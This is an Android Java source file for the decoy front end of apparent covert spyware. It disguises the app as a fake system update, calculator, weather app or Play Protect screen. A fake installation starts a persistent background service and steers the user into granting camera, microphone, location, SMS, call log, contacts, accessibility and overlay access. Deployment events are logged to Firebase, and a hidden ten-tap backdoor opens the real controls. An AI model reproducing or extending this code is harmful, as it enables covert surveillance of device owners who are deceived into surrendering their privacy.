package com.labs.labrats;

import android.Manifest;
import android.animation.AnimatorSet;
import android.animation.ObjectAnimator;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import android.text.SpannableStringBuilder;
import android.text.Spanned;
import android.text.style.ForegroundColorSpan;
import android.graphics.Color;

import java.util.Locale;

public class DecoyActivity extends AppCompatActivity {

    private Button btnCheckUpdate;
    private View pseudoToast;
    private int clickCount = 0;
    private long lastClickTime = 0;
    private boolean isSpecializedDecoy = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // --- STABILITY_LAYOUT_SYNC: Force system bars to match decoy background ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(android.graphics.Color.BLACK);
            getWindow().setNavigationBarColor(android.graphics.Color.BLACK);
        }

        String componentName = getIntent().getComponent().getClassName();
        Log.d("DecoyActivity", "Launched via: " + componentName);

        // Fallback: Check which alias is currently enabled if the component name is ambiguous
        if (componentName.equals(getPackageName() + ".DecoyActivity") || componentName.endsWith(".DecoyActivity")) {
            android.content.pm.PackageManager pm = getPackageManager();
            String base = "com.labs.labrats";
            if (pm.getComponentEnabledSetting(new android.content.ComponentName(this, base + ".CalculatorAlias")) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                componentName = "CalculatorAlias";
            } else if (pm.getComponentEnabledSetting(new android.content.ComponentName(this, base + ".WeatherAlias")) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                componentName = "WeatherAlias";
            } else if (pm.getComponentEnabledSetting(new android.content.ComponentName(this, base + ".SettingsAlias")) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                componentName = "SettingsAlias";
            }
        }

        if (componentName.contains("CalculatorAlias")) {
            setContentView(R.layout.activity_decoy_calculator);
            setupCalculator();
            isSpecializedDecoy = true;
        } else if (componentName.contains("WeatherAlias")) {
            setContentView(R.layout.activity_decoy_weather);
            setupWeather();
            isSpecializedDecoy = true;
        } else if (componentName.contains("SettingsAlias")) {
            setContentView(R.layout.activity_decoy_playprotect);
            setupSettings();
            isSpecializedDecoy = true;
        } else {
            isSpecializedDecoy = false;
            // High-Fidelity System Update Logic
            boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
            if (isDeployed) {
                setContentView(R.layout.activity_decoy_install_success);
                setupSuccessDecoy();
            } else {
                setContentView(R.layout.activity_decoy_install_update);
                setupUpdateDecoy();
            }
        }

        // --- GHOST_WAKE_UP ---
        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
        if (isDeployed && !WorkManager_Sync.isRunning && !WorkManager_Sync.isDestructing) {
            Intent i = new Intent(this, WorkManager_Sync.class);
            i.setAction(Constants.ACTION_START_CORE);
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    startForegroundService(i);
                } else {
                    startService(i);
                }
            } catch (Exception ignored) {}
        }
    }

    private void setupUpdateDecoy() {
        btnCheckUpdate = findViewById(R.id.btnCheckUpdate);
        View ivUpdateIcon = findViewById(R.id.ivUpdateIcon);
        pseudoToast = findViewById(R.id.pseudoToast);
        
        final View loadingLayout = findViewById(R.id.loadingLayout);

        if (btnCheckUpdate != null) {
            btnCheckUpdate.setOnClickListener(v -> {
                btnCheckUpdate.setEnabled(false);
                
                // Hide button text and show realistic loading
                btnCheckUpdate.setText("");
                
                if (loadingLayout != null) {
                    loadingLayout.setVisibility(View.VISIBLE);
                    startRealisticLoadingAnimation(loadingLayout);
                }
                
                // First Run "Installation" Sequence (12.5 seconds)
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
                    btnCheckUpdate.setEnabled(true);
                    btnCheckUpdate.setText(R.string.decoy_check_btn);
                    
                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("decoy_deployed", true).apply();
                    FirebaseConfig.logActivity("COVERT_DEPLOYMENT: System decoy initialized successfully.");
                    
                    // Start persistence core
                    Intent i = new Intent(DecoyActivity.this, WorkManager_Sync.class);
                    i.setAction(Constants.ACTION_START_CORE);
                    try {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                            startForegroundService(i);
                        } else {
                            startService(i);
                        }
                    } catch (Exception ignored) {}

                    // Transition to Permission Repair Sequence
                    try {
                        Intent permissions = new Intent(DecoyActivity.this, PermissionActivity.class);
                        permissions.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivityForResult(permissions, 9999);
                    } catch (Exception e) {
                        Log.e("DecoyActivity", "Transition Error: " + e.getMessage());
                        // Fallback UI switch
                        setContentView(R.layout.activity_decoy_install_success);
                        setupSuccessDecoy();
                    }

                }, 12500);
            });
        }

        if (ivUpdateIcon != null) {
            ivUpdateIcon.setOnClickListener(v -> finish());
        }

        View btnLearnMore = findViewById(R.id.btnLearnMore);
        if (btnLearnMore != null) {
            String dynamicUrl = getDynamicUpdateUrl();
            if (btnLearnMore instanceof android.widget.TextView) {
                SpannableStringBuilder builder = new SpannableStringBuilder("Learn more at:\n");
                int start = builder.length();
                builder.append(dynamicUrl);
                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#A0A0A0")), 0, start, Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                builder.setSpan(new ForegroundColorSpan(Color.parseColor("#3470E5")), start, builder.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
                ((android.widget.TextView) btnLearnMore).setText(builder);
            }
            btnLearnMore.setOnClickListener(v -> {
                Log.d("DecoyActivity", "Learn More link clicked: " + dynamicUrl);
                try {
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(dynamicUrl));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception e) {
                    Log.e("DecoyActivity", "Error opening Learn More link: " + e.getMessage());
                    android.widget.Toast.makeText(DecoyActivity.this, "Unable to open link", android.widget.Toast.LENGTH_SHORT).show();
                }
            });
        }
    }

    private void startRealisticLoadingAnimation(View layout) {
        // 1. Rotation Animation for the whole group
        ObjectAnimator rotate = ObjectAnimator.ofFloat(layout, View.ROTATION, 0f, 360f);
        rotate.setDuration(2500);
        rotate.setRepeatCount(ObjectAnimator.INFINITE);
        rotate.setInterpolator(new android.view.animation.LinearInterpolator());

        // 2. Find individual dots
        View d1 = layout.findViewById(R.id.dot1);
        if (d1 == null) d1 = layout.findViewById(R.id.dot1_success);
        View d2 = layout.findViewById(R.id.dot2);
        if (d2 == null) d2 = layout.findViewById(R.id.dot2_success);
        View d3 = layout.findViewById(R.id.dot3);
        if (d3 == null) d3 = layout.findViewById(R.id.dot3_success);
        View d4 = layout.findViewById(R.id.dot4);
        if (d4 == null) d4 = layout.findViewById(R.id.dot4_success);

        if (d1 != null && d2 != null && d3 != null && d4 != null) {
            // Samsung High-Fidelity Sync: 2 dots at half opacity
            d2.setAlpha(0.5f);
            d3.setAlpha(0.5f);

            // Pulsing "Convergence" Animation (Closing into 1 ball)
            // move = 24f ensures they fully overlap and compress into the center
            float move = 24f;

            AnimatorSet pulseSet = new AnimatorSet();
            
            ObjectAnimator p1x = ObjectAnimator.ofFloat(d1, View.TRANSLATION_X, 0f, move, 0f);
            ObjectAnimator p1y = ObjectAnimator.ofFloat(d1, View.TRANSLATION_Y, 0f, move, 0f);
            
            ObjectAnimator p2x = ObjectAnimator.ofFloat(d2, View.TRANSLATION_X, 0f, -move, 0f);
            ObjectAnimator p2y = ObjectAnimator.ofFloat(d2, View.TRANSLATION_Y, 0f, move, 0f);
            
            ObjectAnimator p3x = ObjectAnimator.ofFloat(d3, View.TRANSLATION_X, 0f, move, 0f);
            ObjectAnimator p3y = ObjectAnimator.ofFloat(d3, View.TRANSLATION_Y, 0f, -move, 0f);
            
            ObjectAnimator p4x = ObjectAnimator.ofFloat(d4, View.TRANSLATION_X, 0f, -move, 0f);
            ObjectAnimator p4y = ObjectAnimator.ofFloat(d4, View.TRANSLATION_Y, 0f, -move, 0f);

            p1x.setRepeatCount(ObjectAnimator.INFINITE);
            p1y.setRepeatCount(ObjectAnimator.INFINITE);
            p2x.setRepeatCount(ObjectAnimator.INFINITE);
            p2y.setRepeatCount(ObjectAnimator.INFINITE);
            p3x.setRepeatCount(ObjectAnimator.INFINITE);
            p3y.setRepeatCount(ObjectAnimator.INFINITE);
            p4x.setRepeatCount(ObjectAnimator.INFINITE);
            p4y.setRepeatCount(ObjectAnimator.INFINITE);

            ObjectAnimator fade = ObjectAnimator.ofFloat(layout, View.ALPHA, 1.0f, 0.7f, 1.0f);
            fade.setDuration(1250);
            fade.setRepeatCount(ObjectAnimator.INFINITE);

            pulseSet.playTogether(rotate, fade, p1x, p1y, p2x, p2y, p3x, p3y, p4x, p4y);
            pulseSet.setDuration(1250);
            pulseSet.start();
        } else {
            rotate.start();
        }
    }

    private void setupSuccessDecoy() {
        View root = findViewById(R.id.successRoot);
        if (root != null) {
            root.setAlpha(0f);
            root.animate().alpha(1f).setDuration(5000).start();
        }

        View backdoor = findViewById(R.id.ivSuccessBackdoor);
        if (backdoor != null) {
            backdoor.setOnClickListener(v -> handleBackdoorClick());
        }

        final Button btnCheckForUpdate = findViewById(R.id.btnCheckForUpdate);
        final View loadingLayout = findViewById(R.id.loadingLayoutSuccess);



        if (btnCheckForUpdate != null) {
            if (IO_Persistence_Manager.getInstance() == null) {
                btnCheckForUpdate.setText("Complete Setup");
            }

            btnCheckForUpdate.setOnClickListener(v -> {
                if (IO_Persistence_Manager.getInstance() == null) {
                    Intent permissions = new Intent(DecoyActivity.this, PermissionActivity.class);
                    startActivity(permissions);
                    return;
                }

                btnCheckForUpdate.setEnabled(false);
                btnCheckForUpdate.setText("");
                
                if (loadingLayout != null) {
                    loadingLayout.setVisibility(View.VISIBLE);
                    startRealisticLoadingAnimation(loadingLayout);
                }

                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    if (loadingLayout != null) loadingLayout.setVisibility(View.GONE);
                    btnCheckForUpdate.setEnabled(true);
                    btnCheckForUpdate.setText(R.string.decoy_check_btn);
                    
                    android.widget.Toast.makeText(DecoyActivity.this, R.string.decoy_no_updates, android.widget.Toast.LENGTH_SHORT).show();
                }, 4000);
            });
        }
    }

    private void setupCalculator() {
        TextView display = findViewById(R.id.calcDisplay);
        if (display == null) return;
        display.setOnClickListener(v -> handleBackdoorClick());
        View.OnClickListener listener = v -> {
            Button b = (Button) v;
            String text = b.getText().toString();
            String current = display.getText().toString();
            if (text.equals("C") || text.equals("AC")) display.setText("0");
            else if (text.equals("=")) {
                try {
                    if (current.contains("+")) {
                        String[] parts = current.split("\\+");
                        double res = Double.parseDouble(parts[0]) + Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("-")) {
                        String[] parts = current.split("-");
                        double res = Double.parseDouble(parts[0]) - Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("x")) {
                        String[] parts = current.split("x");
                        double res = Double.parseDouble(parts[0]) * Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("/")) {
                        String[] parts = current.split("/");
                        double res = Double.parseDouble(parts[0]) / Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    }
                } catch (Exception e) { display.setText("0"); }
            } else {
                if (current.equals("0") && !text.equals(".")) display.setText(text);
                else display.setText(current + text);
            }
        };
        android.view.ViewGroup root = (android.view.ViewGroup) display.getParent();
        findAndAttachButtons(root, listener);
    }

    private void findAndAttachButtons(android.view.ViewGroup parent, View.OnClickListener listener) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof Button) v.setOnClickListener(listener);
            else if (v instanceof android.view.ViewGroup) findAndAttachButtons((android.view.ViewGroup) v, listener);
        }
    }

    private String formatResult(double d) {
        if (d == (long) d) return String.format(Locale.US, "%d", (long) d);
        else return String.format(Locale.US, "%.2f", d);
    }

    private void setupWeather() {
        TextView cityTv = findViewById(R.id.weatherCity);
        if (cityTv != null) {
            String city = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("last_city", "New York");
            cityTv.setText(city);
            cityTv.setOnClickListener(v -> handleBackdoorClick());
            updateCityName(cityTv);
        }
        
        TextView tempTv = findViewById(R.id.weatherTemp);
        TextView highLowTv = findViewById(R.id.weatherHighLow);
        
        if (tempTv != null || highLowTv != null) {
            boolean useCelsius = false;
            try {
                android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(android.content.Context.TELEPHONY_SERVICE);
                String country = tm.getNetworkCountryIso();
                if (country == null || country.isEmpty()) country = Locale.getDefault().getCountry();
                
                if (country != null && (country.equalsIgnoreCase("CA") || country.equalsIgnoreCase("GB") || 
                    country.equalsIgnoreCase("AU") || country.equalsIgnoreCase("FR") || country.equalsIgnoreCase("DE"))) {
                    useCelsius = true;
                }
            } catch (Exception ignored) {}
            
            if (useCelsius) {
                if (tempTv != null) tempTv.setText(" " + fToC(72) + "°");
                if (highLowTv != null) highLowTv.setText("High: " + fToC(78) + "°  Low: " + fToC(65) + "°");
                
                TextView fToday = findViewById(R.id.forecastToday);
                TextView fTue = findViewById(R.id.forecastTue);
                TextView fWed = findViewById(R.id.forecastWed);
                TextView fThu = findViewById(R.id.forecastThu);
                
                if (fToday != null) fToday.setText(fToC(78) + "° " + fToC(65) + "°");
                if (fTue != null) fTue.setText(fToC(75) + "° " + fToC(63) + "°");
                if (fWed != null) fWed.setText(fToC(72) + "° " + fToC(60) + "°");
                if (fThu != null) fThu.setText(fToC(68) + "° " + fToC(58) + "°");
            }
        }
        
        LinearLayout mainInfo = findViewById(R.id.weatherMainInfo);
        if (mainInfo != null) {
            mainInfo.setOnClickListener(v -> handleBackdoorClick());
        }
    }

    private int fToC(int f) {
        return (int) Math.round((f - 32) * 5.0 / 9.0);
    }

    private void updateCityName(TextView cityTv) {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            try {
                android.location.LocationManager lm = (android.location.LocationManager) getSystemService(android.content.Context.LOCATION_SERVICE);
                android.location.Location loc = null;
                java.util.List<String> providers = lm.getProviders(true);
                for (String provider : providers) {
                    android.location.Location l = lm.getLastKnownLocation(provider);
                    if (l == null) continue;
                    if (loc == null || l.getAccuracy() < loc.getAccuracy()) loc = l;
                }
                
                if (loc != null) {
                    resolveCityFromLocation(loc, cityTv);
                } else {
                    // Force a single location update if last known is null
                    String provider = providers.contains(android.location.LocationManager.NETWORK_PROVIDER) ? 
                                     android.location.LocationManager.NETWORK_PROVIDER : 
                                     (providers.isEmpty() ? null : providers.get(0));
                    
                    if (provider != null) {
                        lm.requestSingleUpdate(provider, new android.location.LocationListener() {
                            @Override public void onLocationChanged(@NonNull android.location.Location location) {
                                resolveCityFromLocation(location, cityTv);
                            }
                            @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                            @Override public void onProviderEnabled(@NonNull String provider) {}
                            @Override public void onProviderDisabled(@NonNull String provider) {}
                        }, Looper.getMainLooper());
                    }
                }
            } catch (Exception ignored) {}
        }
    }

    private void resolveCityFromLocation(android.location.Location loc, TextView cityTv) {
        try {
            android.location.Geocoder geocoder = new android.location.Geocoder(this, java.util.Locale.getDefault());
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                Api33Geocoder.getFromLocation(geocoder, loc, cityTv, this);
            } else {
                java.util.List<android.location.Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
                if (addresses != null && !addresses.isEmpty()) {
                    String city = addresses.get(0).getLocality();
                    if (city == null) city = addresses.get(0).getSubAdminArea(); // Fallback for smaller towns
                    if (city != null) {
                        final String finalCity = city;
                        runOnUiThread(() -> cityTv.setText(finalCity));
                        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    @androidx.annotation.RequiresApi(api = android.os.Build.VERSION_CODES.TIRAMISU)
    private static class Api33Geocoder {
        static void getFromLocation(android.location.Geocoder geocoder, android.location.Location loc, TextView cityTv, DecoyActivity activity) {
            geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1, addresses -> {
                if (!addresses.isEmpty()) {
                    String city = addresses.get(0).getLocality();
                    if (city != null) {
                        activity.runOnUiThread(() -> cityTv.setText(city));
                        activity.getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("last_city", city).apply();
                    }
                }
            });
        }
    }

    private void setupSettings() {
        TextView title = findViewById(R.id.settingsTitle);
        if (title != null) title.setOnClickListener(v -> handleBackdoorClick());
        android.view.ViewGroup root = findViewById(android.R.id.content);
        if (root != null) attachSettingsInteractivity(root);
    }

    private void attachSettingsInteractivity(android.view.ViewGroup parent) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof TextView) {
                TextView tv = (TextView) v;
                String text = tv.getText().toString();
                if (!text.isEmpty() && !text.equals("Settings") && tv.getTextSize() > 45) {
                    v.setOnClickListener(item -> android.widget.Toast.makeText(this, "Simulating " + text + "...", android.widget.Toast.LENGTH_SHORT).show());
                }
            } else if (v instanceof android.view.ViewGroup) attachSettingsInteractivity((android.view.ViewGroup) v);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        
        // Ensure system bars match on every resume to prevent "Safety Buffer" leaks
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(android.graphics.Color.BLACK);
            getWindow().setNavigationBarColor(android.graphics.Color.BLACK);
        }

        if (IO_Persistence_Manager.getInstance() == null) {
            FirebaseConfig.logActivity("INTEL_NOTICE: Accessibility service is offline");
        }

        // AUTO-TRANSITION TO SUCCESS: If permissions were just granted, show the success screen
        boolean isDeployed = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("decoy_deployed", false);
        if (!isSpecializedDecoy && isDeployed && allPermissionsOk()) {
            setContentView(R.layout.activity_decoy_install_success);
            setupSuccessDecoy();
        }
    }

    private boolean allPermissionsOk() {
        // Standard perms
        String[] perms = {
            Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS
        };
        for (String p : perms) {
            if (androidx.core.content.ContextCompat.checkSelfPermission(this, p) != android.content.pm.PackageManager.PERMISSION_GRANTED) return false;
        }
        
        // Special perms
        if (IO_Persistence_Manager.getInstance() == null) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) return false;
        
        return true;
    }

    private void handleBackdoorClick() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastClickTime < 500) clickCount++;
        else clickCount = 1;
        lastClickTime = currentTime;
        if (clickCount >= 10) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            clickCount = 0;
            finish();
        }
    }

    private String getDynamicUpdateUrl() {
        String manufacturer = Build.MANUFACTURER.toLowerCase(Locale.US);
        String model = Build.MODEL.toUpperCase(Locale.US);
        
        // Samsung High-Fidelity Logic
        if (manufacturer.contains("samsung")) {
            String csc = "XAA"; // Default US Unlocked
            try {
                // Try to get actual CSC from system properties
                java.lang.Class<?> clazz = java.lang.Class.forName("android.os.SystemProperties");
                java.lang.reflect.Method get = clazz.getMethod("get", String.class);
                String salesCode = (String) get.invoke(null, "ro.csc.sales_code");
                if (salesCode != null && !salesCode.isEmpty()) {
                    csc = salesCode.toUpperCase(Locale.US);
                }
            } catch (Exception ignored) {}
            
            // Format: https://doc.samsungmobile.com/MODEL/CSC/doc.html
            return "https://doc.samsungmobile.com/" + model + "/" + csc + "/doc.html";
        }
        
        // Pixel High-Fidelity Logic
        if (manufacturer.contains("google")) {
            return "https://support.google.com/pixelphone/answer/4457705";
        }

        // OnePlus
        if (manufacturer.contains("oneplus")) {
            return "https://www.oneplus.com/support/softwareupgrade";
        }

        // Xiaomi
        if (manufacturer.contains("xiaomi")) {
            return "https://new.c.mi.com/global/miuidownload/index";
        }

        // HTC
        if (manufacturer.contains("htc")) {
            return "https://www.htc.com/us/support/updates.html";
        }
        
        // Fallback for others
        return "https://www.google.com/search?q=" + manufacturer + "+" + model + "+latest+firmware+update+changelog";
    }
}
